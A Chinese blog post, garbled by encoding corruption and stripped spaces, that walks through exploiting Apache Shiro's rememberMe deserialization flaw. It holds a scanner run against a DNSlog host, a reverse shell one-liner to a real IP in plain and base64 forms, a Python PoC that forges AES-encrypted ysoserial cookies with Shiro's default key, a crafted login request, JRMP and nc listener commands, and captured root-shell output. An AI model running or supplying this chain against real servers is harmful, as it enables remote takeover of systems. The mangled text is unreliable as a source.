    "content"  : "ShiroDeserå†™åœ¨æ–‡å‰ï¼šæœ¬æ–‡æ˜¯æˆ‘è‡ªå·±åœ¨å®è·µä¸­çš„ä¸€äº›ç†è§£å’Œç»å†ï¼Œå¸Œæœ›èƒ½å¤Ÿè®°å½•ä¸‹æ¥ï¼›ç¬¬ä¸€å°ç»“æ˜¯åæœŸåœ¨è‡ªå·±å¯¹è¿™ä¸ªæ¡†æ¶æœ‰ä¸€å®šçš„è®¤çŸ¥ååšçš„æ€»ç»“ï¼Œä¿®æ”¹è®°å½•å¯ä»¥çœ‹ä¸‹é¢ï¼Œç¬¬äºŒå°ç»“æ˜¯åœ¨å­¦ä¹ ä¸­åœ¨ç½‘ä¸Šçš„ä¸€äº›å­¦ä¹ è¿‡ç¨‹ï¼Œå½“æ—¶ä¹Ÿè®°å½•ä¸‹æ¥äº†ã€‚æ•…æ­¤åˆ†ä¸ºä¸¤ä¸ªå°ç»“ã€‚â€”â€”è‡´å‹¤å¥‹çš„æ‰€æœ‰äººä¸ä¸€æ ·çš„SHIROæ¡†æ¶æµ…ææ€è·¯æ¢³ç†Â Â Â SHIROæ¡†æ¶ç®€ä»‹ä»¥åŠç›¸å…³ç”¨é€”ååºåˆ—åŒ–åˆ†æä¸ºä»€ä¹ˆå†™è¿™æ ·çš„ä»£ç ååºåˆ—åŒ–å®æˆ˜âœ…ç®€ä»‹ï¼šå…³äºSHIROçš„å†å²å’Œç›¸å…³å®ç°ç»„ä»¶âœ…JAVAä»£ç ååºåˆ—åŒ–FRAMESâå¼€å‘è€…å†™è¿™æ ·ä»£ç çš„ç”¨æ„âœ…åˆ©ç”¨GADGETç”ŸæˆCOOKIEâœ…ç”¨é€”ï¼šSHIROæ¡†æ¶çš„ä½¿ç”¨åœºæ™¯å’Œè§£å†³ç—›ç‚¹âœ…è°ƒè¯•ç¯å¢ƒéƒ¨ç½²âå¼€å‘è€…å¦‚ä½•ä¿®å¤âœ…æœ€ç»ˆç›®æ ‡ï¼šGETSHELLæœ¬æ–‡åˆæ¬¡è®°äº2020/05/18ï¼›ä¸€æ¬¡ä¿®æ”¹äº2021/01/04ä¸Šåˆï¼›æ·»åŠ äº†æ–‡ç« ç›®å½•ï¼›åœ¨åŸå…ˆæ–‡ç« åŸºç¡€ä¸å˜çš„æƒ…å†µä¸‹ï¼Œè°ƒæ•´äº†æ•´ä½“æ–‡ç« çš„é˜è¿°æ¡†æ¶ï¼Œæ·»åŠ å¦‚ä¸‹ï¼šæŠ€æœ¯åˆ†æï¼›å¼€å‘åˆ†æã€‚é›¶ï¼šShiroæ¡†æ¶çš„ç®€ä»‹å’Œç›¸å…³ç”¨é€”ApacheShiroï¼ˆè¯»ä½œâ€œsheerohâ€ï¼Œå³æ—¥è¯­â€œåŸâ€ï¼‰æ˜¯ä¸€ä¸ªå¼€æºå®‰å…¨æ¡†æ¶ï¼Œæä¾›èº«ä»½éªŒè¯ã€æˆæƒã€å¯†ç å­¦å’Œä¼šè¯ç®¡ç†ã€‚Shiroæ¡†æ¶ç›´è§‚ã€æ˜“ç”¨ï¼ŒåŒæ—¶ä¹Ÿèƒ½æä¾›å¥å£®çš„å®‰å…¨æ€§ã€‚â€”â€”â€”â€”æ¥è‡ªäºç»´åŸºç™¾ç§‘0x01ï¼šç®€ä»‹Shiroä¸‰ä¸ªæ ¸å¿ƒç»„ä»¶ï¼šSubject,SecurityManagerå’ŒRealms.Subjectï¼šå³â€œå½“å‰æ“ä½œç”¨æˆ·â€ã€‚ä½†æ˜¯ï¼Œåœ¨Shiroä¸­ï¼ŒSubjectè¿™ä¸€æ¦‚å¿µå¹¶ä¸ä»…ä»…æŒ‡äººï¼Œä¹Ÿå¯ä»¥æ˜¯ç¬¬ä¸‰æ–¹è¿›ç¨‹ã€åå°å¸æˆ·ï¼ˆDaemonAccountï¼‰æˆ–å…¶ä»–ç±»ä¼¼äº‹ç‰©ã€‚å®ƒä»…ä»…æ„å‘³ç€â€œå½“å‰è·Ÿè½¯ä»¶äº¤äº’çš„ä¸œè¥¿â€ã€‚Subjectä»£è¡¨äº†å½“å‰ç”¨æˆ·çš„å®‰å…¨æ“ä½œï¼ŒSecurityManageråˆ™ç®¡ç†æ‰€æœ‰ç”¨æˆ·çš„å®‰å…¨æ“ä½œã€‚SecurityManagerï¼šå®ƒæ˜¯Shiroæ¡†æ¶çš„æ ¸å¿ƒï¼Œå…¸å‹çš„Facadeæ¨¡å¼ï¼ŒShiroé€šè¿‡SecurityManageræ¥ç®¡ç†å†…éƒ¨ç»„ä»¶å®ä¾‹ï¼Œå¹¶é€šè¿‡å®ƒæ¥æä¾›å®‰å…¨ç®¡ç†çš„å„ç§æœåŠ¡ã€‚Realmï¼šRealmå……å½“äº†Shiroä¸åº”ç”¨å®‰å…¨æ•°æ®é—´çš„â€œæ¡¥æ¢â€æˆ–è€…â€œè¿æ¥å™¨â€ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“å¯¹ç”¨æˆ·æ‰§è¡Œè®¤è¯ï¼ˆç™»å½•ï¼‰å’Œæˆæƒï¼ˆè®¿é—®æ§åˆ¶ï¼‰éªŒè¯æ—¶ï¼ŒShiroä¼šä»åº”ç”¨é…ç½®çš„Realmä¸­æŸ¥æ‰¾ç”¨æˆ·åŠå…¶æƒé™ä¿¡æ¯ã€‚ä»è¿™ä¸ªæ„ä¹‰ä¸Šè®²ï¼ŒRealmå®è´¨ä¸Šæ˜¯ä¸€ä¸ªå®‰å…¨ç›¸å…³çš„DAOï¼šå®ƒå°è£…äº†æ•°æ®æºçš„è¿æ¥ç»†èŠ‚ï¼Œå¹¶åœ¨éœ€è¦æ—¶å°†ç›¸å…³æ•°æ®æä¾›ç»™Shiroã€‚å½“é…ç½®Shiroæ—¶ï¼Œä½ å¿…é¡»è‡³å°‘æŒ‡å®šä¸€ä¸ªRealmï¼Œç”¨äºè®¤è¯å’Œï¼ˆæˆ–ï¼‰æˆæƒã€‚é…ç½®å¤šä¸ªRealmæ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯è‡³å°‘éœ€è¦ä¸€ä¸ªã€‚Shiroå†…ç½®äº†å¯ä»¥è¿æ¥å¤§é‡å®‰å…¨æ•°æ®æºï¼ˆåˆåç›®å½•ï¼‰çš„Realmï¼Œå¦‚LDAPã€å…³ç³»æ•°æ®åº“ï¼ˆJDBCï¼‰ã€ç±»ä¼¼INIçš„æ–‡æœ¬é…ç½®èµ„æºä»¥åŠå±æ€§æ–‡ä»¶ç­‰ã€‚å¦‚æœç³»ç»Ÿé»˜è®¤çš„Realmä¸èƒ½æ»¡è¶³éœ€æ±‚ï¼Œä½ è¿˜å¯ä»¥æ’å…¥ä»£è¡¨è‡ªå®šä¹‰æ•°æ®æºçš„è‡ªå·±çš„Realmå®ç°ã€‚0x02ï¼šç”¨é€”ApacheShiroæ˜¯Javaçš„ä¸€ä¸ªå®‰å…¨æ¡†æ¶ã€‚Shiroå¯ä»¥éå¸¸å®¹æ˜“çš„å¼€å‘å‡ºè¶³å¤Ÿå¥½çš„åº”ç”¨ï¼Œå…¶ä¸ä»…å¯ä»¥ç”¨åœ¨JavaSEç¯å¢ƒï¼Œä¹Ÿå¯ä»¥ç”¨åœ¨JavaEEç¯å¢ƒï¼ŒShiroå¯ä»¥å¸®åŠ©æˆ‘ä»¬å®Œæˆï¼šè®¤è¯ã€æˆæƒã€åŠ å¯†ã€ä¼šè¯ç®¡ç†ã€ä¸Webé›†æˆã€ç¼“å­˜ç­‰ã€‚ä¸Šé¢è¯´çš„æ¯”è¾ƒå®˜æ–¹ä¸€ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•ä¸€ç‚¹ç†è§£ï¼Œå¥¹å°±æ˜¯ä¸€ä¸ªå¼€æºçš„é›†æˆæƒé™æ¡†æ¶ï¼Œè¿™æ˜¯æˆ‘ä»¬åœ¨å¸‚é¢ä¸Šå¾ˆå¤šçš„åº”ç”¨ã€‚æˆ‘ä»¬åœ¨æ¼æ´æŒ–æ˜çš„è¿‡ç¨‹ä¸­ï¼Œå¦‚æœå­˜åœ¨WEBéªŒè¯æœºåˆ¶ï¼Œæœ‰å¯èƒ½ä¼šå­˜åœ¨ç™»å½•ç»•è¿‡ï¼Œæ‰€ä»¥ç°åœ¨å¾ˆå¤šj2eeå¼€å‘éƒ½ä¼šé‡‡ç”¨shiroæ¡†æ¶æ¥åšæƒé™æ§åˆ¶ï¼Œæ¡†æ¶çš„ä¼˜åŠ¿æ˜¯ååˆ†æ˜æ˜¾çš„ï¼Œä½†å‡¡äº‹æœ‰åˆ©æœ‰å¼Šï¼Œæœ‰ä¼˜åŠ¿å½“ç„¶å°±å­˜åœ¨åŠ£åŠ¿ã€‚shiroæ˜¯æˆ‘åœ¨å‚åŠ å·¥ä½œåæ‰ä¼šæ…¢æ…¢å»æ¥è§¦åˆ°ï¼›ä»ä¸€å¼€å§‹çš„ä»£å®¡ï¼Œå†åˆ°é»‘ç›’æ¸—é€ï¼Œå†åˆ°å‰ä¸€æ®µæ—¶é—´åˆšç»“æŸçš„HWè¡ŒåŠ¨ã€‚ç›®å‰ï¼Œä½¿ç”¨ApacheShiroçš„äººè¶Šæ¥è¶Šå¤šï¼Œå› ä¸ºå®ƒç›¸å½“ç®€å•ï¼Œå¯¹æ¯”SpringSecurityï¼Œå¯èƒ½æ²¡æœ‰SpringSecurityåšçš„åŠŸèƒ½å¼ºå¤§ï¼Œä½†æ˜¯åœ¨å®é™…å·¥ä½œæ—¶å¯èƒ½å¹¶ä¸éœ€è¦é‚£ä¹ˆå¤æ‚çš„ä¸œè¥¿ï¼Œæ‰€ä»¥ä½¿ç”¨å°è€Œç®€å•çš„Shiroå°±è¶³å¤Ÿäº†ã€‚å¯¹äºå®ƒä¿©åˆ°åº•å“ªä¸ªå¥½ï¼Œè¿™ä¸ªä¸å¿…çº ç»“ï¼Œèƒ½æ›´ç®€å•çš„è§£å†³é¡¹ç›®é—®é¢˜å°±å¥½äº†ã€‚ä¸€ï¼šShiroæ¡†æ¶ååºåˆ—åŒ–çš„åŸå› 1x01ï¼šShiroä»£ç å±‚åˆ†æweb.xml&lt;welcome-file-list&gt;&lt;welcome-file&gt;index.jsp&lt;/welcome-file&gt;&lt;/welcome-file-list&gt;ä»£ç å¤§è‡´é€»è¾‘ï¼š&lt;jsp:forwardpage=\"home.jsp\"/&gt;//è·³åˆ°home.jsphomeé¡µé¢åŒ…å«include.jsp&lt;%@includefile=\"include.jsp\"%&gt;//include.jspå¯¼å…¥SecurityUtilsç±»&lt;%@pageimport=\"org.apache.shiro.SecurityUtils\"%&gt;âŒ˜+å·¦é”®å•å‡»SecurityUtilsè·³è½¬shiro-core-1.2.4.jar!/org/apache/shiro/SecurityUtils.classé‚£ä¹ˆæˆ‘ä»¬å‡è®¾SecurityUtilsç±»æ˜¯shiroæ¡†æ¶è®¤è¯å…¥å£ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦æ¢³ç†æ¸…æ¥šå¯¹åº”ä»£ç é€»è¾‘å³å¯ï¼›å‚è€ƒShiroè®¤è¯æµç¨‹åˆ†æShiroç™»å½•è®¤è¯æºç è¯¦è§£å…ˆç›´æ¥åœ¨home.jspé¡µé¢å¤„ä¸‹æ–­ç‚¹ï¼Œå¤„ç†æµç¨‹å¤§æ¦‚å¦‚ä¸‹ï¼šJavaServerPagesï¼š_jspService(HttpServletRequest,HttpServletResponse):21,index_jsp//æ­£å¸¸jspserverè¯·æ±‚service(HttpServletRequest,HttpServletResponse):71,HttpJspBase//serverå“åº”requestï¼Œè¿”å›JSESSIONIDservice(ServletRequest,ServletResponse):733,HttpServlet//ä»¥è¿”å›çš„JSESSIONIDCOOKIEè®¿é—®http://127.0.0.1:8080/shiro/accountServerApplethttpServerletShirowebServerletShiroHttpServletRequestwebhttpè®¿é—®åï¼Œè®¿é—®è°ƒç”¨å¦‚ä¸‹ï¼šthis={index_jsp@4030}request={ShiroHttpServletRequest@5282}response={ResponseFacade@4532}_jspx_method=\"GET\"out={JspWriterImpl@5284}_jspx_out={JspWriterImpl@5284}_jspx_page_context={PageContextImpl@5285}pageContext={PageContextImpl@5285}åŸºæœ¬ä¸Šå°±æ˜¯è¿™ä¸ªæµç¨‹ï¼›1x02ï¼šä¸ºä»€ä¹ˆè¿™ä¹ˆå†™æ›´æ–°ä¸­...äºŒï¼šéªŒè¯åœ¨ä¸Šé¢çš„ç®€è¿°ä¸­ï¼Œå¯ä»¥æ¥è¿›è¡Œshiroæ¡†æ¶çš„åˆ¤æ–­æ¼æ´ç‰¹å¾ï¼š1.åœ¨è¿”å›åŒ…çš„Set-Cookieçš„å€¼ä¸ºã€ŒrememberMe=deleteMeã€ï¼›2.JESSessionCookie.å®é™…æ¸—é€ä¸­å¦‚æœé‡åˆ°å¯ä»¥å°è¯•åŠ å…¥rememberMeCookieæ¢æµ‹æ˜¯å¦ä½¿ç”¨shiroæ¡†æ¶ï¼›3.ç‰¹å®šCMSé›†æˆshiroæ¡†æ¶ï¼›1ï¼‰jeesite2ï¼‰iBase4Jç­‰ç­‰åŒæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥è¿›ä¸€æ­¥å¯¹shiroæ¡†æ¶æ˜¯å¦å­˜åœ¨ååºåˆ—åŒ–æ¥è¿›è¡ŒéªŒè¯ï¼šç”¨åˆ°çš„æ˜¯Shiroscanbyæ–¯æ–‡è„šæœ¬ï¼Œå¼€æºåœ¨githubä¸Šï¼Œç”¨æ³•å°±ä¸å¤šèµ˜è¿°ã€‚python3shiro_rce.pyhttps://shiro.vuln.ip/login.html\"pingx.dnslog.cn\"__________/___|||__(_)______/___|_________\\___\\|'_\\||'__/_\\___\\/__/_`|'_\\___)|||||||(_)|__)|(_|(_||||||____/|_||_|_|_|\\___/____/\\___\\__,_|_||_|Byæ–¯æ–‡WelcomeToShiroååºåˆ—åŒ–RCE![*]å¼€å§‹æ£€æµ‹æ¨¡å—Class1:CommonsBeanutils1ç„¶åè„šæœ¬å¼€å§‹å¯¹ä¸åŒçš„ç§˜é’¥è¿›è¡Œç”Ÿæˆcookieï¼Œå°è¯•è®©æœºå™¨æ‰§è¡Œå‘½ä»¤ã€‚ç­‰å¾…è„šæœ¬åœ¨è·‘çš„æ—¶å€™æˆ–è€…è·‘å®Œï¼Œçœ‹ä¸€ä¸‹dnslogä¸Šçš„dnsè®°å½•ï¼Œå¦‚æœå­˜åœ¨è®°å½•å¦‚ä¸‹æ‰€ç¤ºï¼Œé‚£ä¹ˆå°±è¯´æ˜å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ä½¿å¾—æœºå™¨æ‰§è¡Œäº†ä»»æ„ä»£ç ï¼Œåä¹‹åˆ™æ— ï¼šx.dnslog.cnshiro.vuln.ip2020-07-0216:46:35x.dnslog.cnshiro.vuln.ip2020-07-0216:45:52x.dnslog.cnshiro.vuln.ip2020-07-0216:45:52x.dnslog.cnshiro.vuln.ip2020-07-0216:45:52å½“ç„¶æœ‰çš„æ—¶å€™ç”¨shiroScanæ‰«ç»“æŸåå¹¶æ²¡æœ‰è®°å½•ï¼Œå³ä¸å­˜åœ¨æ¼æ´ï¼›ä½†æ˜¯åƒæˆ‘ï¼Œåˆä¸æ­»å¿ƒï¼Œäºæ˜¯åˆåœ¨ç½‘ä¸ŠæŠ˜è…¾æ‰¾äº†å¦å¤–ä¸€ä¸ªèƒ½å¤Ÿè·‘ç§˜é’¥çš„æ¢æµ‹è„šæœ¬-_-ä½œè€…åšå®¢pythonshiro_exp.pyhttps://shiro.vuln.ip/login.htmltryCipherKey:4AvVhmFLUs0KTA3Kprsdag==generatorpayloaddone.sendpayloadok.checking.....checking.....checking.....checking.....vulnerable:trueurl:https://shiro.vuln.ip/login.htmlCipherKey:3AvVhmFLUs0KTA3Kprsdag==å½“ç„¶ç§˜é’¥å¯¹äºæˆ‘ä»¬ç†è§£shiroååºåˆ—åŒ–æ¡†æ¶ä¹Ÿæœ‰ä¸€å®šçš„å¸®åŠ©ï¼Œshiroçš„ååºåˆ—åŒ–æœ€åˆçš„æ¼æ´æ¥æºä¹Ÿæ˜¯å› ä¸ºç§˜é’¥ç¡¬ç¼–ç ã€‚2x01ï¼šgetshellé€šè¿‡ä¸Šé¢çš„æ­¥éª¤æˆ‘ä»¬å°±å¯ä»¥å¯¹shiroååºåˆ—åŒ–åšä¸€ä¸ªåˆ¤å®šï¼Œè‚¯å®šæ˜¯å­˜åœ¨RCEæ¼æ´ï¼Œé‚£ä¹ˆæ¥å®ç°æˆ‘ä»¬çš„æœ€ç»ˆç›®çš„ï¼ŒGET-shellä¸€èˆ¬åå¼¹shellçš„æ‰§è¡Œä»£ç bash-i&gt;&amp;/dev/tcp/47.52.233.92/111110&gt;&amp;1ï¼Œé¦–å…ˆéœ€è¦æŠŠä»£ç è¿›è¡Œbase64ç¼–ç ï¼Œåªæœ‰ç»è¿‡base64ç¼–ç åshiroæ‰è®¤å¾—è¿™ä¸ªå‘½ä»¤ï¼Œé€šè¿‡shiroè‡ªå·±æœ¬èº«çš„base64è§£ç æœ€ç»ˆè¾¾åˆ°æ‰§è¡Œå‘½ä»¤çš„ç›®çš„ï¼›è½¬æˆbase64ç¼–ç :bash-c{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny41Mi4yMzMuOTIvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}åƒæˆ‘æ¯”è¾ƒå·æ‡’ï¼Œå°±ç›´æ¥åœ¨è„šæœ¬ä¸Šæ·»åŠ åå¼¹shellï¼Œè¿™æ ·çš„å¥½å¤„å°±æ˜¯æˆ‘ä»¬ä¸éœ€è¦åœ¨ç”Ÿæˆpocçš„è„šæœ¬é‡Œæ›¿æ¢cookieï¼Œç”±è„šæœ¬è‡ªåŠ¨ç”Ÿæˆçš„cookieè‡ªåŠ¨å»è·‘ï¼Œçœäº‹å¾ˆå¤šjava.lang.Runtime.exec()è½¬æ¢ç½‘å€ç›‘å¬ç«¯å£ç­‰å¾…shellå›è¿ï¼ˆæˆ‘è¿™é‡Œçš„æ ·ä¾‹æ˜¯dockerç¯å¢ƒï¼‰nc-lvvp11111Listeningon[0.0.0.0](family0,port11111)Connectionfrom59.110.152.16847274received!bash:cannotsetterminalprocessgroup(1):Inappropriateioctlfordevicebash:nojobcontrolinthisshellroot@6d5a7848dbef:/#ididuid=0(root)gid=0(root)groups=0(root)2x02ï¼šå­¦ä¹ å·¥å…·ä½¿ç”¨ysoserialè¿›è¡Œæµé‡ç›‘å¬ï¼Œä¸‹é¢æ˜¯ysoserialçš„jaråŒ…ç”Ÿæˆï¼Œæ‡‚å¾—å¼€å‘åŒå­¦éƒ½æ‡‚ã€‚gitclonehttps://github.com/frohoff/ysoserial.gitcdysoserialmvnpackage-DskipTests2x03ï¼šhowtopocä½¿ç”¨pocä»£ç è·å¾—å¯¹åº”çš„rememberMeçš„cookieå€¼ã€‚#-*-coding:utf-8-*-importsysimportuuidimportbase64importsubprocessfromCrypto.CipherimportAESdefencode_rememberme(command):popen=subprocess.Popen(['java','-jar','ysoserial-0.0.6-SNAPSHOT-all.jar','JRMPClient',command],stdout=subprocess.PIPE)BS=AES.block_sizepad=lambdas:s+((BS-len(s)%BS)*chr(BS-len(s)%BS)).encode()key=base64.b64decode(\"kPH+bIxk5D2deZiIxcaaaA==\")iv=uuid.uuid4().bytesencryptor=AES.new(key,AES.MODE_CBC,iv)file_body=pad(popen.stdout.read())base64_ciphertext=base64.b64encode(iv+encryptor.encrypt(file_body))returnbase64_ciphertextif__name__=='__main__':payload=encode_rememberme(sys.argv[1])print\"rememberMe={0}\".format(payload.decode())D:\\bin4xin\\code\\shiro\\shrio-poc\\ysoserial\\target&gt;python.\\shrio-poc.py47.52.233.92:6666rememberMe=W8BOhPe8Qdy8FJ5N9genqt4WjZaONr1NQ+dXgDCV1RrGHUwMfd8ljlA9AG64t7vzUesOp7YKsz6EFFHgyrq1qRqUiPFBnEBi/NNNpE2UR8CgMsf1KY2rbBurFv1Gwslv2+SL7hy3YNq9cpPWm5S8o+nJpa6IyI9cZ+n7a+6hjB4Yfnf89u3BLi4AxOXL35SotH2AdSX2iZrWgGAcah9oW21JwpC2zj4YMjsGf2tPYUysP873bYYHuSIohaXf3bcq4YuQajMctVmM3IvjeY5Ggva9QRUvo5B1o0sPNHdXGwn/z9t/KWcSeTWE+Dt2f95a9QjEIoic6s88Tv0SKjY6UdCmTxN3vVE8rs1haiA48R1CuUQQiWa9V28m2qkonX9aUEUl4kTGGvF+Y5eB4MaNTw==æŠ“åŒ…ï¼Œå‰å°ç™»å½•æ‹¦åŒ…ï¼Œå‹¾é€‰RememberMeï¼Œæˆªè·æ•°æ®åŒ…ï¼Œæ›¿æ¢cookieæ„é€ æ•°æ®åŒ…ï¼šPOST/doLoginHTTP/1.1underattack-host:underattack-host:8080Content-Length:55Cache-Control:max-age=0Origin:http://underattack-host:8080Upgrade-Insecure-Requests:1DNT:1Content-Type:application/x-www-form-urlencodedUser-Agent:Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/81.0.4044.138Safari/537.36Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer:http://underattack-host:8080/loginAccept-Encoding:gzip,deflateAccept-Language:zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Cookie:rememberMe=RFUadguvSoq4kMm3ZwnkO/MHiokCrqrCURXUqUWaXLBM7/fBF65qvjWDFZeh49zHDRm5oKPU1AhmbEBaYRp3ASrQpHdp7mYrChOi51tmq9qkzWemDnjbUXtp8B6RF1EUNV2q2tKaKlf4AAR1hZIRJGbz4CpLeumNAeWB98f6/T0GaWJGGve9rP6l9/7iU5Y9Xj4ZmSBP6LgMHYF3TJ2DDdTNI4nPITeQI3S+9ol/BmT14Be5m0ENfOkm1cdm3L8Rj/pbeE842Y3nUioEdAXizCrOsCYT+u2QTWHt1YZLmB/xsfQvEV5bRpRJeRv/ps7V00PiXvCeaPQoDs541wqB75+/RRAdqU8TWnJE7YhvQVkxTRLvCjBTtwfkgA3XVA8X+518nh0wSoj8/Ajaoi5MbA==Connection:closeusername=asdmnin&amp;password=asdasd&amp;rememberme=remember-meä½¿ç”¨åŒ…ç›‘å¬6666ç«¯å£ï¼šroot@iZj6cgn7odv59wmjjhe6zwZ:/home/tool/shiro_poc/POC-2/ysoserial/target#java-cpysoserial-0.0.6-SNAPSHOT-all.jarysoserial.exploit.JRMPListener6666CommonsCollections4'bash-c{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny41Mi4yMzMuOTIvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}'*OpeningJRMPlisteneron6666å‘åŒ…ï¼Œæˆ‘ä»¬çœ‹åˆ°jrmpç›‘å¬çš„ç«¯å£å·²ç»æœ‰æµé‡å›æµå›æ¥äº†ï¼Œå¦‚ä¸‹ï¼šHaveconnectionfrom/underattack-host:58272Readingmessage...IsDGCcallfor[[0:0:0,356978429],[0:0:0,2006635131]]Sendingreturnwithpayloadforobj[0:0:0,2]ClosingconnectionHaveconnectionfrom/underattack-host:58274Readingmessage...IsDGCcallfor[[0:0:0,356978429],[0:0:0,-1104978848],[0:0:0,2006635131]]Sendingreturnwithpayloadforobj[0:0:0,2]Closingconnectionæ¡ˆä¾‹/usr/local/nginx/conf/nginx.confinetaddr:192.168.100.242Bcast:192.168.100.255Mask:255.255.255.0&lt;!--ApacheShiro--&gt;&lt;filter&gt;&lt;filter-name&gt;shiroFilter&lt;/filter-name&gt;&lt;filter-class&gt;org.springframework.web.filter.DelegatingFilterProxy&lt;/filter-class&gt;&lt;init-param&gt;&lt;param-name&gt;targetFilterLifecycle&lt;/param-name&gt;&lt;param-value&gt;true&lt;/param-value&gt;&lt;/init-param&gt;&lt;/filter&gt;&lt;filter-mapping&gt;&lt;filter-name&gt;shiroFilter&lt;/filter-name&gt;&lt;url-pattern&gt;/*&lt;/url-pattern&gt;&lt;/filter-mapping&gt;&lt;!--PageCache,cache.htmlsuffix.&lt;filter&gt;&lt;filter-name&gt;PageCacheFilter&lt;/filter-name&gt;&lt;filter-class&gt;com.thinkgem.jeesite.common.filter.PageCachingFilter&lt;/filter-class&gt;&lt;/filter&gt;&lt;filter-mapping&gt;&lt;filter-name&gt;PageCacheFilter&lt;/filter-name&gt;&lt;url-pattern&gt;/&lt;/url-pattern&gt;&lt;/filter-mapping&gt;&lt;filter-mapping&gt;&lt;filter-name&gt;PageCacheFilter&lt;/filter-name&gt;&lt;url-pattern&gt;*.html&lt;/url-pattern&gt;&lt;/filter-mapping&gt;--&gt;&lt;!--SiteMesh--&gt;&lt;filter&gt;&lt;filter-name&gt;sitemeshFilter&lt;/filter-name&gt;&lt;filter-class&gt;com.opensymphony.sitemesh.webapp.SiteMeshFilter&lt;/filter-class&gt;&lt;/filter&gt;&lt;filter-mapping&gt;&lt;filter-name&gt;sitemeshFilter&lt;/filter-name&gt;&lt;url-pattern&gt;/a/*&lt;/url-pattern&gt;&lt;/filter-mapping&gt;&lt;filter-mapping&gt;&lt;filter-name&gt;sitemeshFilter&lt;/filter-name&gt;&lt;url-pattern&gt;/f/*&lt;/url-pattern&gt;&lt;/filter-mapping&gt;&lt;?xmlversion=\"1.0\"encoding=\"UTF-8\"?&gt;&lt;beansxmlns=\"http://www.springframework.org/schema/beans\"xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"xmlns:context=\"http://www.springframework.org/schema/context\"xsi:schemaLocation=\"http://www.springframework.org/schema/beanshttp://www.springframework.org/schema/beans/spring-beans-4.0.xsdhttp://www.springframework.org/schema/contexthttp://www.springframework.org/schema/context/spring-context-4.0.xsd\"default-lazy-init=\"true\"&gt;&lt;description&gt;ShiroConfiguration&lt;/description&gt;&lt;!--åŠ è½½é…ç½®å±æ€§æ–‡ä»¶--&gt;&lt;context:property-placeholderignore-unresolvable=\"true\"location=\"classpath:jeesite.properties\"/&gt;&lt;!--Shiroæƒé™è¿‡æ»¤è¿‡æ»¤å™¨å®šä¹‰--&gt;&lt;beanname=\"shiroFilterChainDefinitions\"class=\"java.lang.String\"&gt;&lt;constructor-arg&gt;&lt;value&gt;/static/**=anon/userfiles/**=anon${adminPath}/cas=cas${adminPath}/login=authc${adminPath}/isValidateKlp=anon${adminPath}/queryLoingname=anon${adminPath}/ukeyIsExist=anon${adminPath}/validSlider/**=anon${adminPath}/dataInterface/**=anon${adminPath}/sys/forget/**=anon&lt;!--ç™»å½•é¡µå¿˜è®°å¯†ç --&gt;${adminPath}/logout=logout${adminPath}/**=user/act/rest/service/editor/**=perms[act:model:edit]/act/rest/service/model/**=perms[act:model:edit]/act/rest/service/**=user/ReportServer/**=user${mobilePath}/**=anon&lt;/value&gt;&lt;/constructor-arg&gt;&lt;/bean&gt;&lt;!--å®‰å…¨è®¤è¯è¿‡æ»¤å™¨--&gt;&lt;beanid=\"shiroFilter\"class=\"org.apache.shiro.spring.web.ShiroFilterFactoryBean\"&gt;&lt;propertyname=\"securityManager\"ref=\"securityManager\"/&gt;&lt;!--&lt;propertyname=\"loginUrl\"value=\"${cas.server.url}?service=${cas.project.url}${adminPath}/cas\"/&gt;--&gt;&lt;propertyname=\"loginUrl\"value=\"${adminPath}/login\"/&gt;&lt;propertyname=\"successUrl\"value=\"${adminPath}?login\"/&gt;&lt;propertyname=\"filters\"&gt;&lt;map&gt;&lt;entrykey=\"cas\"value-ref=\"casFilter\"/&gt;&lt;entrykey=\"authc\"value-ref=\"formAuthenticationFilter\"/&gt;&lt;/map&gt;&lt;/property&gt;&lt;propertyname=\"filterChainDefinitions\"&gt;&lt;refbean=\"shiroFilterChainDefinitions\"/&gt;&lt;/property&gt;&lt;/bean&gt;&lt;!--CASè®¤è¯è¿‡æ»¤å™¨--&gt;&lt;beanid=\"casFilter\"class=\"org.apache.shiro.cas.CasFilter\"&gt;&lt;propertyname=\"failureUrl\"value=\"${adminPath}/login\"/&gt;&lt;/bean&gt;&lt;!--å®šä¹‰Shiroå®‰å…¨ç®¡ç†é…ç½®--&gt;&lt;beanid=\"securityManager\"class=\"org.apache.shiro.web.mgt.DefaultWebSecurityManager\"&gt;&lt;propertyname=\"realm\"ref=\"systemAuthorizingRealm\"/&gt;&lt;propertyname=\"sessionManager\"ref=\"sessionManager\"/&gt;&lt;propertyname=\"cacheManager\"ref=\"shiroCacheManager\"/&gt;&lt;/bean&gt;&lt;!--è‡ªå®šä¹‰ä¼šè¯ç®¡ç†é…ç½®--&gt;&lt;beanid=\"sessionManager\"class=\"com.thinkgem.jeesite.common.security.shiro.session.SessionManager\"&gt;&lt;propertyname=\"sessionDAO\"ref=\"sessionDAO\"/&gt;&lt;!--ä¼šè¯è¶…æ—¶æ—¶é—´ï¼Œå•ä½ï¼šæ¯«ç§’--&gt;&lt;propertyname=\"globalSessionTimeout\"value=\"${session.sessionTimeout}\"/&gt;&lt;!--å®šæ—¶æ¸…ç†å¤±æ•ˆä¼šè¯,æ¸…ç†ç”¨æˆ·ç›´æ¥å…³é—­æµè§ˆå™¨é€ 